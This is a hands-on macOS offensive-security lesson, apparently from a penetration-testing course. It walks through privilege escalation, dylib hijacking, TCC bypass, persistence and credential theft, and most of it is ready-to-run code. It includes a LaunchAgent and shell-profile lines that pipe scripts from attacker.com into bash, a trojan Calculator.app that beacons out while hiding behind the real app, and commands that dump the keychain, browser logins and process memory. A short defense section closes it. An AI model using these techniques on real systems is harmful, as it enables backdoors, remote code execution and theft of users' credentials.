# LESSON 10: macOS Security & Exploitation

## Objective
Master macOS-specific security mechanisms, privilege escalation techniques, and persistence methods. Learn to bypass security features like SIP, Gatekeeper, and TCC while maintaining stealth.

## Prerequisites
- Lessons 1-9 completed
- Access to macOS system
- Understanding of Unix/Linux concepts
- Basic knowledge of macOS architecture

## Phase 1: macOS Security Architecture

### Step 1: Security Feature Assessment
```bash
# System Integrity Protection (SIP) status
csrutil status
csrutil disable  # Requires Recovery Mode

# Gatekeeper status
spctl --status
spctl --assess --verbose /path/to/app

# FileVault encryption status
fdesetup status
diskutil cs list

# Secure Boot status (T2/Apple Silicon)
nvram -p | grep -i secure
```

### Step 2: User and System Enumeration
```bash
# Current user context
id
dscl . -read /Users/$(whoami)
groups

# System information
system_profiler SPSoftwareDataType
sw_vers
uname -a

# Running processes and services
ps aux | head -20
launchctl list | grep -v "0\t0"
```

### Step 3: Network and Service Discovery
```bash
# Network interfaces and connections
ifconfig
netstat -an | grep LISTEN
lsof -i TCP -sTCP:LISTEN

# Installed applications
ls /Applications/
system_profiler SPApplicationsDataType | grep -A 5 -B 5 "Location:"

# Scheduled jobs and launch agents
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/
ls -la /Library/LaunchDaemons/
ls -la /System/Library/LaunchDaemons/
```

## Phase 2: Privilege Escalation

### Step 4: SUID Binary Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -v "/System"
find /usr -perm -4000 -type f 2>/dev/null

# Common vulnerable SUID binaries
ls -la /usr/bin/sudo
ls -la /usr/libexec/security_authtrampoline

# Exploit examples (if vulnerable)
# CVE-2021-30724 - sudo privilege escalation
sudo -u \#$(id -u) id
```

### Step 5: macOS-Specific Privilege Escalation
```bash
# Check for admin group membership
dseditgroup -o checkmember -m $(whoami) admin

# Exploit cron job permissions
crontab -l
ls -la /usr/lib/cron/tabs/

# Directory permissions abuse
ls -la /private/var/at/jobs/
ls -la /private/var/cron/tabs/

# Application bundle manipulation
find /Applications -name "*.app" -perm -2 2>/dev/null
```

### Step 6: Dylib Hijacking
```bash
# Find applications with weak dylib loading
otool -L /Applications/App.app/Contents/MacOS/App

# Look for @executable_path, @loader_path vulnerabilities
for app in /Applications/*.app; do
    binary="$app/Contents/MacOS/$(basename "$app" .app)"
    if [[ -f "$binary" ]]; then
        otool -L "$binary" | grep -E "@(executable|loader)_path"
    fi
done

# Create malicious dylib
cat > evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor))
static void evil() {
    system("touch /tmp/pwned");
    system("chmod 777 /tmp/pwned");
}
EOF

gcc -dynamiclib -o evil.dylib evil.c
```

## Phase 3: TCC (Transparency, Consent, and Control) Bypass

### Step 7: TCC Database Analysis
```bash
# TCC database locations
ls -la ~/Library/Application\ Support/com.apple.TCC/TCC.db
ls -la /Library/Application\ Support/com.apple.TCC/TCC.db

# Query TCC database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;" 2>/dev/null

# Common TCC services
# kTCCServiceCamera, kTCCServiceMicrophone, kTCCServiceAccessibility,
# kTCCServicePostEvent, kTCCServiceSystemPolicyAllFiles
```

### Step 8: TCC Bypass Techniques
```bash
# Synthetic click bypass (requires accessibility)
osascript -e 'tell application "System Events" to keystroke "password" & return'

# Parent process inheritance
# Launch from authorized parent process

# Application bundle manipulation
# Modify app to inherit permissions

# Entitlement abuse
codesign -d --entitlements - /Applications/App.app/Contents/MacOS/App
```

### Step 9: Accessibility Permission Abuse
```applescript
-- AppleScript for synthetic events
tell application "System Events"
    tell process "SystemUIServer"
        click menu bar item "Wi-Fi" of menu bar 1
        delay 1
        click menu item "Open Network Preferences..." of menu 1 of menu bar item "Wi-Fi" of menu bar 1
    end tell
end tell
```

## Phase 4: Persistence Mechanisms

### Step 10: Launch Agent/Daemon Persistence
```bash
# User-level LaunchAgent
cat > ~/Library/LaunchAgents/com.persistence.agent.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.persistence.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/shell.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.persistence.agent.plist
```

### Step 11: Application Bundle Hijacking
```bash
# Create malicious application bundle
mkdir -p /tmp/Calculator.app/Contents/MacOS
mkdir -p /tmp/Calculator.app/Contents/Resources

cat > /tmp/Calculator.app/Contents/Info.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleDisplayName</key>
    <string>Calculator</string>
    <key>CFBundleExecutable</key>
    <string>Calculator</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.calculator</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
</dict>
</plist>
EOF

cat > /tmp/Calculator.app/Contents/MacOS/Calculator << 'EOF'
#!/bin/bash
# Malicious code here
curl -s http://attacker.com/beacon | bash &
# Launch real calculator to avoid suspicion
/System/Applications/Calculator.app/Contents/MacOS/Calculator
EOF

chmod +x /tmp/Calculator.app/Contents/MacOS/Calculator
```

### Step 12: Shell Profile Persistence
```bash
# Bash profile persistence
echo 'curl -s http://attacker.com/shell.sh | bash &' >> ~/.bashrc
echo 'curl -s http://attacker.com/shell.sh | bash &' >> ~/.bash_profile

# Zsh profile persistence
echo 'curl -s http://attacker.com/shell.sh | bash &' >> ~/.zshrc

# Fish shell persistence
echo 'curl -s http://attacker.com/shell.sh | bash &' >> ~/.config/fish/config.fish
```

## Phase 5: Credential and Data Extraction

### Step 13: Keychain Access
```bash
# List keychains
security list-keychains
security dump-keychain login.keychain

# Extract specific passwords
security find-generic-password -a "username" -s "servicename" -w
security find-internet-password -a "username" -s "server" -w

# Keychain dump (requires user password or privilege escalation)
security dump-keychain -d login.keychain > keychain_dump.txt
```

### Step 14: Browser Data Extraction
```bash
# Chrome passwords (requires user authentication)
cd ~/Library/Application\ Support/Google/Chrome/Default/
sqlite3 "Login Data" "SELECT origin_url, username_value, password_value FROM logins;"

# Safari passwords (keychain protected)
security find-internet-password -g -s "safari" 2>&1 | grep "password:"

# Firefox passwords
cd ~/Library/Application\ Support/Firefox/Profiles/*/
ls -la logins.json key4.db
```

### Step 15: System Information Gathering
```bash
# Hardware information
system_profiler SPHardwareDataType
ioreg -l | grep -E "(model|serial)"

# Network configuration
scutil --dns
networksetup -listallnetworkservices

# Installed software
pkgutil --packages
ls /Applications/ > installed_apps.txt
brew list 2>/dev/null || echo "Homebrew not installed"
```

## Phase 6: Advanced Techniques

### Step 16: Code Signing Bypass
```bash
# Check code signing
codesign -dv /Applications/App.app
spctl -a -t exec -vv /Applications/App.app

# Remove quarantine attribute
xattr -d com.apple.quarantine /path/to/file

# Create fake signature
# Advanced technique requiring certificate manipulation
```

### Step 17: Sandbox Escape
```bash
# Check sandbox status
codesign -d --entitlements - /Applications/App.app/Contents/MacOS/App

# Container escape techniques
ls -la ~/Library/Containers/
ls -la ~/Library/Group\ Containers/

# Symlink attacks
ln -s /etc/passwd ~/Library/Containers/com.app.bundle/Data/passwd
```

### Step 18: Memory Analysis
```bash
# Process memory dumping (requires privileges)
gdb -p [PID]
(gdb) generate-core-file
(gdb) quit

# Search for credentials in memory
strings core.[PID] | grep -E "(password|secret|token)"

# LLDB memory analysis
lldb -p [PID]
(lldb) memory read --size 4 --format x --count 1024 0x7fff5fbff000
```

## Custom Scripts Usage

### macos_enum.py
```bash
# Comprehensive macOS enumeration
python3 scripts/lesson_10_macos_security/macos_enum.py --detailed --output macos_report.json
```

### tcc_bypass.py
```bash
# TCC bypass automation
python3 scripts/lesson_10_macos_security/tcc_bypass.py --service accessibility --method synthetic-click
```

## Evidence Collection

### Step 19: Document macOS Compromise
```bash
# System state capture
system_profiler > system_profile.txt
launchctl list > launchctl_services.txt
ps aux > running_processes.txt

# Security configuration
csrutil status > sip_status.txt
spctl --status > gatekeeper_status.txt
fdesetup status > filevault_status.txt

# Compromise timeline
echo "$(date): macOS system compromised via [method]" >> compromise_log.txt
```

## Success Criteria

✓ Security features (SIP, Gatekeeper, TCC) assessed
✓ Privilege escalation achieved
✓ TCC permissions bypassed
✓ Persistence mechanisms deployed
✓ Keychain data extracted
✓ System information gathered
✓ Advanced bypass techniques implemented
✓ Custom scripts functioning

## macOS Security Bypass Summary

| Security Feature | Bypass Method | Requirements |
|------------------|---------------|--------------|
| SIP | Recovery Mode disable | Physical access |
| Gatekeeper | Quarantine removal | User privileges |
| TCC | Synthetic events | Accessibility permission |
| Code Signing | Attribute removal | User privileges |
| Sandbox | Symlink attacks | Application vulnerability |
| FileVault | Physical attacks | Hardware access |

## Defense Recommendations

- Enable all security features (SIP, Gatekeeper, FileVault)
- Regular security updates
- Monitor Launch Agent/Daemon creation
- Implement endpoint detection and response (EDR)
- User security awareness training
- Network monitoring for C2 traffic
- Application allowlisting
- Regular security assessments

## Forensic Artifacts

### Locations to Monitor
- `/var/log/system.log` - System events
- `~/Library/LaunchAgents/` - User persistence
- `/Library/LaunchDaemons/` - System persistence  
- `~/.bash_history` - Command history
- `~/Library/Application Support/com.apple.TCC/TCC.db` - TCC permissions

## Next Lesson Preview
**Lesson 11**: Cloud Security & Container Attacks
- AWS/Azure enumeration and exploitation
- Container escape techniques  
- Serverless security testing